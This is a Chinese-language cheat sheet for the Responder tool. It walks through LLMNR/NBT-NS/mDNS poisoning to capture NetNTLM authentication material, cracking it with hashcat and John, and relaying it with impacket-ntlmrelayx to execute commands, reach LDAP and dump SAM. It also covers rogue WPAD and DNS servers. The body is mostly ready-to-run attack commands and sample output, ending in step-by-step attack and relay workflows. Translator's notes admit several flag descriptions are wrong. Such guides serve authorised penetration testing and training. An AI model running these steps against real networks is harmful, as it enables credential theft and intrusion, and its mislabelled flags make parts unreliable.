<a id="-responder---llmnrnbt-ns-poisoning"></a>
# 🎣 Responder：LLMNR/NBT-NS 投毒

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
       LLMNR/NBT-NS/mDNS 投毒工具        
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

<a id="-table-of-contents"></a>
## 📋 目录

- [什么是 Responder](#-what-is-responder)
- [安装](#-installation)
- [基本用法](#-basic-usage)
- [捕获 NTLMv2 哈希材料](#-capture-ntlmv2-hashes)
- [中继攻击](#-relay-attacks)
- [伪造服务器](#-rogue-servers)
- [配置](#-configuration)
- [速查](#-quick-reference)

---

<a id="-what-is-responder"></a>
## 🎯 什么是 Responder

**Responder** 通过伪造 LLMNR、NBT-NS 和 mDNS 响应来捕获 NTLM 哈希材料：

- 🎣 **LLMNR 投毒** - 链路本地多播名称解析（Link-Local Multicast Name Resolution）
- 📡 **NBT-NS 投毒** - NetBIOS 名称服务
- 🍎 **mDNS 投毒** - 多播 DNS
- 🔓 **哈希材料捕获** - NTLMv1/NTLMv2 哈希材料
- 🔄 **中继支持** - NTLM 中继攻击

<a id="how-it-works"></a>
### 工作原理

```
1. 用户输入错误的主机名：\\fileservr（拼写错误）
2. DNS 解析失败
3. Windows 广播 LLMNR/NBT-NS 查询
4. Responder 回答："I'm fileservr!"
5. 受害者发送 NTLM 认证材料（原文称哈希）进行身份验证
6. 捕获哈希材料，用于密码恢复／中继（区别见译注）
```

---

<a id="-installation"></a>
## 🚀 安装

<a id="kali-linux"></a>
### Kali Linux

```bash
# 已预装
responder --help

# 更新
sudo apt update && sudo apt install responder

# 或从 GitHub 获取
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

<a id="verify"></a>
### 验证

```bash
responder --help
responder -I eth0 --version
```

---

<a id="-basic-usage"></a>
## 💻 基本用法

<a id="start-responder"></a>
### 启动 Responder

```bash
# 基本用法（捕获哈希材料）
sudo responder -I eth0

# 详细输出
sudo responder -I eth0 -v

# 分析模式（被动）
sudo responder -I eth0 -A
```

<a id="interface-selection"></a>
### 选择接口

```bash
# 以太网
sudo responder -I eth0

# 无线接口
sudo responder -I wlan0

# 列出接口
ip a
```

---

<a id="-capture-ntlmv2-hashes"></a>
## 🔓 捕获 NTLMv2 哈希材料

<a id="basic-capture"></a>
### 基本捕获

```bash
# 启动 Responder
sudo responder -I eth0

# 等待受害者发起请求……
# 输出：
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

<a id="force-ntlmv2"></a>
### 强制 NTLMv2（原文标题，参数含义见译注）

```bash
# 仅 NTLMv2（原文建议用于密码恢复；此处参数有误，见译注）
sudo responder -I eth0 --lm
```

<a id="wpad-capture"></a>
### WPAD 捕获

```bash
# 启用 WPAD 代理
sudo responder -I eth0 -w

# 强制 WPAD 身份验证
sudo responder -I eth0 -wF
```

<a id="hash-locations"></a>
### 哈希文件位置

```bash
# 捕获的哈希材料保存到：
/usr/share/responder/logs/
# 或者
./logs/

# 文件：
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

<a id="crack-captured-hashes"></a>
### 恢复捕获材料对应的密码

```bash
# NTLMv2 格式：
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat（模式 5600）
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

<a id="-relay-attacks"></a>
## 🔄 中继攻击

<a id="disable-smbhttp-for-relay"></a>
### 禁用 SMB/HTTP（用于中继）

```bash
# 编辑 Responder.conf
sudo nano /usr/share/responder/Responder.conf

# 设置：
SMB = Off
HTTP = Off
```

<a id="responder--ntlmrelayx"></a>
### Responder + ntlmrelayx

```bash
# 终端 1：Responder（不启用 SMB/HTTP）
sudo responder -I eth0

# 终端 2：ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# 或配合命令执行
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

<a id="relay-to-ldap"></a>
### 中继至 LDAP

```bash
# Responder
sudo responder -I eth0

# 中继至 LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

<a id="relay-for-sam-dump"></a>
### 通过中继导出 SAM

```bash
# 中继后导出 SAM
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="-rogue-servers"></a>
## 🖥️ 伪造服务器

<a id="built-in-servers"></a>
### 内置服务器

| 服务器 | 端口 | 用途 |
|--------|------|---------|
| SMB | 445 | 文件共享身份验证 |
| HTTP | 80 | Web 身份验证 |
| HTTPS | 443 | 安全 Web |
| FTP | 21 | FTP 身份验证 |
| SQL | 1433 | MSSQL 身份验证 |
| LDAP | 389 | 目录身份验证 |
| WPAD | 80 | 代理配置 |

<a id="enabledisable-servers"></a>
### 启用／禁用服务器

```bash
# 编辑 Responder.conf
[Responder Core]
; 需要启动的服务器
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

<a id="wpad-rogue-proxy"></a>
### 伪造 WPAD 代理

```bash
# 启用 WPAD
sudo responder -I eth0 -w

# 在 WPAD 上强制 Basic 身份验证（原文表述，见译注）
sudo responder -I eth0 -wF

# 自定义 WPAD 脚本
sudo responder -I eth0 -w --wpad-name wpad.dat
```

<a id="dns-spoofing"></a>
### DNS 欺骗

```bash
# 启用 DNS（原文表述，-d 含义见译注）
sudo responder -I eth0 -d

# Responder 充当 DNS 服务器
# 响应所有主机的查询
```

---

<a id="-configuration"></a>
## ⚙️ 配置

<a id="responderconf"></a>
### Responder.conf

```bash
# 位置
/usr/share/responder/Responder.conf
# 或者
./Responder.conf
```

<a id="key-settings"></a>
### 关键设置

```ini
[Responder Core]
; 设为 On 或 Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; 自定义质询（用于彩虹表）
Challenge = Random

; 不响应本地查询（原文表述）
DontRespondTo =

; 仅响应这些 IP
RespondTo =
```

<a id="static-challenge-rainbow-tables"></a>
### 固定质询（彩虹表）

```ini
; 为预计算表设置固定质询
Challenge = 1122334455667788
```

<a id="exclusions"></a>
### 排除项

```ini
; 不响应这些 IP
DontRespondTo = 192.168.1.1, 192.168.1.2

; 仅响应这些地址
RespondTo = 192.168.1.100, 192.168.1.101
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="essential-commands"></a>
### 常用命令

| 命令 | 说明 |
|---------|-------------|
| `responder -I eth0` | 基本捕获 |
| `responder -I eth0 -v` | 详细输出模式 |
| `responder -I eth0 -A` | 仅分析 |
| `responder -I eth0 -w` | 启用 WPAD |
| `responder -I eth0 -wF` | 强制 WPAD 身份验证 |
| `responder -I eth0 -d` | 启用 DNS（原文表述，见译注） |

<a id="flags"></a>
### 参数

| 参数 | 说明 |
|------|-------------|
| `-I` | 接口 |
| `-v` | 详细输出 |
| `-A` | 分析模式（被动） |
| `-w` | 启用 WPAD |
| `-wF` | 强制 WPAD 身份验证 |
| `-d` | 启用 DNS（原文表述，见译注） |
| `-f` | 识别主机指纹 |
| `-b` | 返回 Basic 身份验证 |

<a id="hash-types"></a>
### 哈希材料类型

| 类型 | Hashcat 模式 | John 格式 |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

<a id="attack-workflow"></a>
### 攻击流程

```bash
# 1. 启动 Responder
sudo responder -I eth0 -wFv

# 2. 等待捕获哈希材料
# 哈希材料保存至 ./logs/

# 3. 恢复对应密码
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. 或进行中继（先禁用 SMB）
sudo responder -I eth0  # 配置中设为 SMB=Off
impacket-ntlmrelayx -tf targets.txt -smb2support
```

<a id="relay-workflow"></a>
### 中继流程

```bash
# 1. 查找未要求 SMB 签名的目标
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. 配置 Responder.conf
# SMB = Off
# HTTP = Off

# 3. 启动 Responder
sudo responder -I eth0

# 4. 启动中继
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. 等待被中继的身份验证
```

---

<a id="-resources"></a>
## 📚 参考资料

- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR 投毒](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

<a id="related-cheatsheets"></a>
### 相关速查表
- [Impacket](../../Impacket/translations/README.zh-CN.md)
- [CrackMapExec](../../CrackMapExec/translations/README.zh-CN.md)
- [Hashcat](../../Hashcat/translations/README.zh-CN.md)

---

<p align="center">
  <b>🎣 捕获哈希材料！</b><br>
  <i>Responder：网络凭据材料收集工具</i>
</p>

> 译注：本页若干参数说明有误，但命令保留原样。[Responder 官方参数定义](https://github.com/lgandx/Responder/blob/master/Responder.py)说明 --lm 用于 LM 降级，并非强制 NTLMv2；-d 启用 DHCPv4 投毒，并不是 DNS 服务开关；-wF 的 F 强制获取 wpad.dat 时认证，不代表一定使用 Basic。DNS 等服务器是否启动还取决于配置。--wpad-name、ntlmrelayx 的 --sam 等示例选项须按具体版本核对，不能假定通用。

> 译注：[Microsoft NTLM 概述](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/c50a85f0-5940-42d8-9e82-ed206902e919)说明 NTLM 使用质询／响应。这里常称“哈希”的捕获材料通常是 NetNTLM 认证响应，不是直接发送的存储型 NT 哈希；实时中继也不是把离线捕获文件当作 Pass-the-Hash 输入。混合 NTLMv1／NTLMv2 文件不能一律按模式 5600 处理。中继还依赖权限、签名、通道绑定等条件；“SMB/HTTP 已关闭”须在实际配置中满足，单独启动命令不会自动实现。
